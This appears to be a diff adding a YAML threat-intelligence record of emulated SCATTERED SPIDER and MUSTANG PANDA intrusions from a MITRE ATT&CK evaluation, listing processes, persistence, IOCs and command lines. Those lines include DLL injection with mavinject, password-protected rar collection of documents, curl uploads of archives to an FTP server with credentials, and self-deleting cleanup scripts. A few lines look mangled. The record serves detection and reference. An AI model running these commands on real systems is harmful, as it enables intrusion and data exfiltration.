@@ -1,0 +1,121 @@
+description: Emulated cyber attacks based on SCATTERED SPIDER and MUSTANG PANDA threat
+  actors, covering initial access, discovery, lateral movement, credential access,
+  persistence, collection, and exfiltration.
+attribution: SCATTERED SPIDER, MUSTANG PANDA
+malware_families:
+- TONESHELL
+- PlugX
+- SmugX
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - regsvr32.exe
+  - mavinject.exe
+  - waitfor.exe
+  - PsExec
+  - WinRAR
+  - curl
+  - gup.exe
+  - WinGUpdate.dat
+  - libcurl.dll
+  - msiexec.exe
+  - taskkill.exe
+  - netstat.exe
+  - ipconfig.exe
+  - mswin1.exe
+  - rar.exe
+  - curl.exe
+  commandline:
+  - C:\\Windows\\System32\\regsvr32.exe /s "C:\\Users\\htargaryen\\Downloads\\wsdapi.dll"
+  - C:\\Windows\\System32\\mavinject.exe 8344 /INJECTRUNNING "C:\\Users\\htargaryen\\Downloads\\wsdapi.dll"
+  - netstat -anop tcp
+  - ipconfig /all
+  - mswin1.exe 10.55.4.0/24
+  - '"C:\\Program Files\\WinRAR\\rar.exe" a -r -v250m -hpj5Tft5lLFFcQK -x*\\appdata\\
+    -x*\\ProgramData\\* -x*\\Recovery\\* "-x*\\System Volume Information\\*" -x*\\$RECYCLE.BIN\\*
+    -x*\\Program Files\\* -x*\\Program Files (x86)\\* -x*\\Windows\\* -x*\\Python312\\*
+    -x*\\crash_dumps\\* -x*\\PerfLogs\\* -n@C:\\Users\\htargaryen\\Downloads\\files.txt
+    C:\\Windows\\Temp\\A.rar \\\\10.55.3.105\\A$\\*'
+  - '"C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1" -T "{C:\\windows\\temp\\\\C.rar,C:\\windows\\temp\\\\E.rar,C:\\windows\\temp\\\\F.rar,C:\\windows\\temp\\\\G.rar,C:\\windows\\temp\\\\H.rar,C:\\windows\\temp\\\\J.rar}\"
+    ftp://ftp_user:Gracious-Coat@[IP]/do/ --ftp-create-dirs'
+  - netstat -anop tcpipconfig /all
+  - '"C:\\Program Files\\WinRAR\\rar.exe" a -r -v250m -hpj5Tft5lLFFcQK -x*\\appdata\\
+    -x*\\ProgramData\\* -x*\\Recovery\\* "-x*\\System Volume Information\\*" -x*\\$RECYCLE.BIN\\*
+    "C:\\Users\\htargaryen\\Downloads\\files.txt C:\\Windows\\Temp\\A.rar \\\\10.55.3.105\\A$\\*'
+  - '"C:\\Program Files\\Microsoft VS Code\\prpbg.dat.bak.1" -T "{C:\\\\windows\\\\temp\\\\C.rar,C:\\\\windows\\\\temp\\\\E.rar,C:\\\\windows\\\\temp\\\\F.rar,C:\\\\windows\\\\temp\\\\G.rar,C:\\\\windows\\\\temp\\\\H.rar,C:\\\\windows\\\\temp\\\\J.rar}\"
+    ftp://ftp_user:Gracious-Coat@[IP]/do/ --ftp-create-dirs'
+  - '"C:\\Program Files\\WinRAR\\rar.exe" a -r -m5 -ibck -ed -v325m -hpI1HcgjY7bWRA8
+    -inul -ta202504230000000 C:\\Users\\Public\\Documents\\b44d0xUT5BLOi.rar "C:\\*.pdf"
+    "C:\\*.doc*" "C:\\*.ppt*" "C:\\*.xls*" "C:\\users\\*.png" "C:\\users\\*.jpg" "C:\\users\\*.jpeg"'
+  - curl.exe -T C:\\Users\\Public\\Documents\\b44d0xUT5BLOi.rar ftp://ftp_user:Gracious-Coat@[IP]/dp/
+    --ftp-create-dirs
+  - curl --progress-bar -C --T C:\\programdata\\IDM\\<archive name>.RAR ftp://<ftp
+    username>:<ftp password>@<PUBLOAD ftp server>
+  - '"RAR.exe a -r -m3 -tk -ed -dh -v4500m -hp<archive password> -ibck -ta<cutoff
+    date> -n*.doc* -n*.rtf* -n*.xls* -n*.pdf* -n*.ppt* -n*.jpg* -n*.cdr* -n*.dwg*
+    -n*.png* -n*.psd* -n*.JPE* -n*.BMP* -n*.TIF* -n*.dib* \\"<collection storage path>\\\\<archive
+    name>.RAR\\" \\"<target path for collection>\\""'
+  - cmd /c "echo @echo off > C:\\Users\\ccole\\AppData\\Local\\Temp\\del_WinGupSvc.bat
+    && echo ping 127.0.0.1 -n 5 ^>nul >> C:\\Users\\ccole\\AppData\\Local\\Temp\\del_WinGupSvc.bat
+    && echo del %~f0 >> C:\\Users\\ccole\\AppData\\Local\\Temp\\del_WinGupSvc.bat
+    && C:\\Users\\ccole\\AppData\\Local\\Temp\\del_WinGupSvc.bat"
+  - reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    /v "WinGupSvc" /f
+  - msiexec /uninstall "C:\\Users\\ccole\\Downloads\\2025p2.msi" /quiet
+  - taskkill /f /im gup.exe
+  powershell: []
+  scripting_engine:
+  - Batch
+  - VBS
+  - JScript
+  registry_keys:
+  - SYSTEM
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - wsdapi.dll
+  - libcurl.dll
+  network_connections:
+  - waitfor.exe Event183785251387
+  - PsExec
+  - Visual Studio Code Tunnel
+  - ftp://ftp_user:Gracious-Coat@[IP]/do/
+  - mswin1.exe 10.55.4.0/24
+  - ftp://ftp_user:Gracious-Coat@[IP]/dp/
+  file_activity:
+  - C:\\Users\\htargaryen\\Downloads\\wsdapi.dll
+  - EssosUpdate.exe
+  - Essos Competitiveness Brief.lnk
+  - 250325_Pentos_Board_minutes.rar
+  - NTDS.dit
+  - SYSTEM registry hive
+  - C:\\Windows\\Temp\\A.rar
+  - C:\\Users\\ccole\\AppData\\Local\\Temp\\del_WinGupSvc.bat
+  - C:\\Users\\ccole\\Downloads\\2025p2.msi
+  persistence:
+  - Scheduled task named AccessoryInputServices
+  - WinGupSvc run key
+  process_relations:
+  - regsvr32.exe -> waitfor.exe
+  - waitfor.exe -> PsExec
+  - PsExec -> CodeHelper.bat
+  - msiexec.exe -> gup.exe
+  - gup.exe -> libcurl.dll
+  - libcurl.dll -> WinGUpdate.dat
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 10.55.4.0/24
+  - '[IP]'
+  domains:
+  - it@kingslanding-it[.]net
+  - kingslanding-hr[.]com
+  urls:
+  - ftp://ftp_user:Gracious-Coat@[IP]/do/
+  - ftp://ftp_user:Gracious-Coat@[IP]/dp/
+authors:
+- Kyle Thompson
+- Stewart McIntyre
+reference: https://sophos-production.contentstackapps.com/en-us/blog/game-of-clones-sophos-and-the-mitre-attck-enterprise-2025-evaluations
+date_of_publication: December 19, 2025
+file_creation_date: December 19, 2025
